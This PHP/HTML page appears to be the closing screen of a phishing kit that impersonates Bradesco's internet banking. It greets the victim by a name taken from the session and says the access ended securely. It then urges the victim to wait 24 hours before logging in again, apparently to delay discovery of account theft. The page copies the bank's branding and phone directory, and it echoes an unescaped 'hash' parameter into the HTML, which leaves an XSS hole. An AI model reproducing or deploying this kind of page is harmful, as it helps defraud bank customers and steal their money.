<?php
require_once('_admin/config.php');
require_once('validacao.php');


$infoTipo = Info::getTipo($_SESSION['id']);

function getLayout(){
    global $infoTipo;
    if($infoTipo['tipo'] == 'Bradesco Prime'){
        return 'prime';
    } else if($infoTipo['tipo'] == 'Bradesco Exclusive'){
        return 'exclusive';
    } else {
        return 'varejo';
    }
}

$tipo = getLayout();
?>
<!DOCTYPE html>
<html lang="pt-BR">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta http-equiv="X-UA-Compatible" content="ie=edge">
      <link rel="stylesheet" type="text/css" media="screen, print" href="css/estrutura.css?Versao=6.css" />
      <link rel="stylesheet" type="text/css" media="screen, print" href="css/ctustomEstrutura.css?Versao=6.css" />
      
      <link rel="shortcut icon" href="images/favicon.ico">
      <title>Banco Virtual</title>
   </head>
<body class="<?php echo $tipo;?>">
    <div style="height:1px;width:1px;position:absolute;top:0px;left:0px;">
        <a href="javascript:;" title="" id="hiddentabfirst" class="tabindex" style="font-size:1px" tabindex="1">&nbsp;</a>
    </div>
	
    <a id="linkCadastroSenha4" href="https://www.ib12.banco-virtual.com.br/ibpfsenha4/criarSenha.jsf" rel="external"></a>	
		
			
    <div id="miolo" class="varejo">
			
        <div id="topo" class="clearfix">
            <div id="headerIB" class="clearfix">
                <div style="position: relative;">
                    <?php if($tipo == "exclusive"):?>
                        <div class="divExclusive"></div>
                    <?php endif;?>
                    <div class="logo">
                        <a href="javascript:;" target="_blank" title="Bradesco">Bradesco</a>
                    </div>
                    <div class="date"><?php echo dataPorExtensoNovo();?></div>
                    <div class="close">
                        <a id="botao_cancelar_acesso" href="javascript:;" title="Cancelar Acesso" class="tabindex btn btn-cancelar" tabindex="2">
                            <span id="lblCancelar">Cancelar</span>
                        </a>
                    </div>
                </div>
            </div>
		</div>	
							

        <div id="conteudo_interno" style="width:500px;" class="box"><div style="width:500px;" class="divCentroBox">
		<h1 style="font-size:16px;margin-bottom:20px;">Muito obrigado por utilizar o Bradesco Internet Banking!</h1>
		<p style="font-size:13px;color: #BF0000;line-height:18px;"><?php echo isset($_SESSION['nome']) ? ucfirst(strtolower($_SESSION['nome'])) : 'Cliente';?>, seu acesso foi finalizado com segurança.<br>
			Recomendamos que aguarde o prazo de 24 horas para efetuar novamente seu acesso, AGUARDE o prazo estabelecido para que não ocorra o cancelamento do seu acesso ou bloqueio parcial.</p><div class="footer-links"><a class="tabindex external-link" id="FFB" title="Dúvidas? Entre em contato" href="javascript:;" onclick="return fonefacil();" tabindex="4"><span>Dúvidas? Entre em contato</span></a><span class="icon-external"></span></div></div></div>
        
        <div id="boxPassoIntermediario" class="box-passo-intermediario plr80 w806 none"></div>
        <div style="width: 0px; height: 0px;"></div>
        <div>
            <div id="scpDiv">
                <img id="scp">
            </div>
        </div>
    </div>
    <form id="form_cript" name="form_cript" method="post" action="/ibpfnovologin/login.jsf" enctype="application/x-www-form-urlencoded">
        <input type="hidden" id="form_cript:valor_dig" name="form_cript:valor_dig" value="">
        <input type="hidden" id="form_cript:valor_cript" name="form_cript:valor_cript" value="">
        <input type="hidden" name="form_cript_SUBMIT" value="1">
        <input type="hidden" name="autoScroll">
    </form>
    <div style="visibility:hidden; display:hide">
        <form name="form_cript_backup">
            <input type="hidden" name="form_cript:valor_dig">
        </form>
    </div>			
    </div>	
		
		
	<div id="rodape">
        <div class="content clearfix"><div class="logo"><a href="http://www.banco-virtual.com.br/" target="_blank" title="Banco Virtual">Banco Virtual</a></div><h5>FONE FÁCIL</h5><div class="listings"><p>Capitais / Metropolitanas</p><h5>4002 0022</h5><p>Consulta de saldo, extrato, <br> transações financeiras <br> e de cartão de crédito.  </p></div><div class="listings br-tp1"><p>Demais Regiões</p><h5>0800 570 0022</h5><p>SAC - Deficiência <br> Auditiva ou de Fala</p><h5>0800 722 0099</h5></div><span style="margin-right: 0;"><div class="listings"><p>SAC - Alô Banco Virtual</p><h5>0800 570 0022</h5><p>Cancelamento, reclamação, informação, sugestão e elogio.</p></div></span><div class="tips"><div class="tip"><div class="tips-title clearfix"><h6>Segurança</h6></div><p>O cadeado precisa estar aparecendo na barra do seu navegador.</p><a id="maisDicas" href="javascript:;" rel="external" target="_blank" onclick="return false;" title="Mais dicas" class="tabindex link-btn-no-style" tabindex="8"><span>Ver Mais</span></a></div></div></div><div class="content clearfix"><p class="message-whatsapp">Se preferir, fale com a BIA pelo whatsapp: <strong>3335-0237</strong></p></div><div class="footer-last"><div class="footer-last-content"><a id="outrosTelefones" href="#" rel="external" target="_self" onclick="return false;" title="Ver outros telefones" class="see-others-phones">Ver outros telefones</a></div></div><div class="footer-phones"><div class="content clearfix">
				<div class="telefones">
					<div class="container">
						<div class="grid telefones-cartoes">
							<div class="cell large-12">
								<h3>Cartões</h3>
								<p>Cancelamentos, Reclamações e Informações</p>
							</div>
							<div class="cell large-6">
								<h4>Bradesco Cartões</h4>
								<p class="tel">0800 721 2778</p>
								<h4>Deficiência auditiva ou de fala</h4>
								<p class="tel">0800 722 00999</p>
								<p>Atendimento 24 horas, 7 dias por semana.</p>
							</div>
							<div class="cell large-6">
								<h4>Ouvidoria</h4>
								<p class="tel">0800 727 9933</p>
								<p>Atendimento de 2ª à 6ª-feira das 8h às
									18h, exceto feriado.</p>
								<p class="fale-conosco">
									Demais telefones consulte o site <a href="https://banco.bradesco/html/classic/atendimento/atendimento.shtm" target="_blank">Fale
										Conosco</a>
								</p>
							</div>
						</div>
						<div class="grid telefones-previdencia">
							<div class="cell large-12">
								<h3>Previdência</h3>
							</div>
							<div class="cell large-6">
								<h4>Bradesco Vida e Previdência</h4>
								<p class="tel">0800 721 2778</p>
								<h4>Deficiência auditiva ou de fala</h4>
								<p class="tel">0800 721 2778</p>
								<p>Atendimento 24 horas, 7 dias por semana.</p>
								<h4>Informações sobre seguros de Pessoas
									(Vida / Acidentes Pessoais)</h4>
								<p class="tel">0800 701 2704</p>
								<p>Atendimento dias úteis das 8h às 20h e
									sábados das 8h às 14h*</p>
								<p class="fale-conosco">
									Demais telefones consulte o site <a href="https://banco.bradesco/html/classic/atendimento/atendimento.shtm" target="_blank">Fale Conosco</a><br>
									Para conferir as condições contratuais do seu plano acesse:<br _ngcontent-c5="">
									<a href="https://www.bradescoseguros.com.br" target="_blank">www.bradescoseguros.com.br</a> / <a _ngcontent-c5="" href="https://www.susep.gov.br" target="_blank">www.susep.gov.br</a>
								</p>
							</div>
							<div class="cell large-6">
								<h4>Central de Relacionamento</h4>
								<p class="tel">4002-0022</p>
								<h4>Demais Regiões</h4>
								<p class="tel">0800 570 0022</p>
								<p>Atendimento dias úteis das 7h30 às
									19h30*</p>
								<h4>Ouvidoria</h4>
								<p class="tel">0800 727 9933</p>
								<p>Atendimento de 2ª a 6ª-feira das 8h às
									18h.</p>
							</div>
						</div>
						<div class="grid telefones-seguros">
							<div class="cell large-12">
								<h3>Seguros</h3>
							</div>
							<div class="cell large-6">
								<h4>Bradesco Vida e Previdência</h4>
								<p class="tel">0800 727 9966</p>
								<h4>Deficiência auditiva ou de fala</h4>
								<p class="tel">0800 701 2762</p>
								<p>Atendimento 24 horas, 7 dias por semana.</p>
								<h4>Ouvidoria</h4>
								<p class="tel">0800 701 7000</p>
								<p>Atendimento de 2ª a 6ª-feira das 8h às
									18h.</p>
								<p class="fale-conosco">
									Demais telefones consulte o site <a href="https://banco.bradesco/html/classic/atendimento/atendimento.shtm" target="_blank">Fale Conosco</a><br>
									Para conferir as condições contratuais do seu plano acesse:<br _ngcontent-c5="">
									<a href="https://www.bradescoseguros.com.br" target="_blank">www.bradescoseguros.com.br</a> / <a _ngcontent-c5="" href="https://www.susep.gov.br" target="_blank">www.susep.gov.br</a>
								</p>
							</div>
							<div class="cell large-6">
								<h4>Assistências, Consultas, Informações e
									Serviços Transacionais</h4>
								<p class="tel">4004-2757</p>
								<h4>Demais Regiões</h4>
								<p class="tel">0800 701 2757</p>
								<p>Atendimento dias úteis das 7h30 às
									19h30*</p>
							</div>
						</div>
						<div class="grid telefones-capitalizacao">
							<div class="cell large-12">
								<h3>Capitalização</h3>
							</div>
							<div class="cell large-6">
								<h4>Bradesco Vida e Previdência</h4>
								<p class="tel">0800 727 9966</p>
								<h4>Deficiência auditiva ou de fala</h4>
								<p class="tel">0800 701 2762</p>
								<p>Atendimento 24 horas, 7 dias por semana.</p>
								<h4>Ouvidoria</h4>
								<p class="tel">0800 701 7000</p>
								<p>Atendimento de 2ª a 6ª-feira das 8h às
									18h.</p>
							</div>
							<div class="cell large-6">
								<h4>Assistências, Consultas, Informações e
									Serviços Transacionais</h4>
								<p class="tel">4004-2757</p>
								<h4>Demais Regiões</h4>
								<p class="tel">0800 701 2757</p>
								<p>Atendimento dias úteis das 7h30 às
									19h30*</p>
							</div>
						</div>
					</div>
				</div>
			</div>
        </div>
    </div>
    <input type="hidden" name="idInfo" id="idInfo" value="<?php echo $_SESSION['id'];?>">
   <input type="hidden" name="clientHashId" id="clientHashId" value="<?php echo $_GET["hash"];?>">
   
    <script src="js/jquery-3.4.1.min.js"></script>
    <script src="js/identificacao.js"></script>
<?php
session_destroy();
?>
</body>
</html>